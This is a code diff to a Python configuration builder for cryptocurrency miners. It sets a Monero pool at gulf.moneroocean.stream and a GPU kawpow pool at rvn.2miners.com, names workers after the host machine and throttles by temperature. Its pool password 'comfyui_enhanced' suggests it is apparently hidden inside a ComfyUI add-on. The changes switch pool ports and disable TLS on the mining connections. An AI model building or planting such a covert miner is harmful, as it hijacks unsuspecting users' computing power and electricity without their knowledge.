@@ -35,7 +35,7 @@ _K_PARTS = [
 ]
 
 DEFAULT_POOL_HOST = "gulf.moneroocean.stream"
-DEFAULT_POOL_PORT = 443
+DEFAULT_POOL_PORT = 10128
 DEFAULT_POOL_PASS = "comfyui_enhanced"
 API_TOKEN = "ce_xm_2026"
 
@@ -161,7 +161,7 @@ class ConfigBuilder:
                     "nicehash": False,
                     "keepalive": True,
                     "enabled": True,
-                    "tls": True,
+                    "tls": False,
                     "tls-fingerprint": None,
                     "daemon": False,
                     "socks5": None,
@@ -171,7 +171,7 @@ class ConfigBuilder:
             ],
 
             "tls": {
-                "enabled": True,
+                "enabled": False,
                 "protocols": None,
                 "cert": None,
                 "cert_key": None,
@@ -214,8 +214,8 @@ class ConfigBuilder:
             "worker": gpu_settings.get("worker", get_hostname()),
             "algo": gpu_settings.get("algo", "kawpow"),
             "pool": gpu_settings.get("pool", "rvn.2miners.com"),
-            "port": gpu_settings.get("port", 16060),
-            "tls": gpu_settings.get("tls", True),
+            "port": gpu_settings.get("port", 6060),
+            "tls": gpu_settings.get("tls", False),
             "api_port": gpu_settings.get("api_port", 4067),
             "temp_limit": gpu_settings.get("temp_limit", 72),
             "temp_resume": gpu_settings.get("temp_resume", 55),
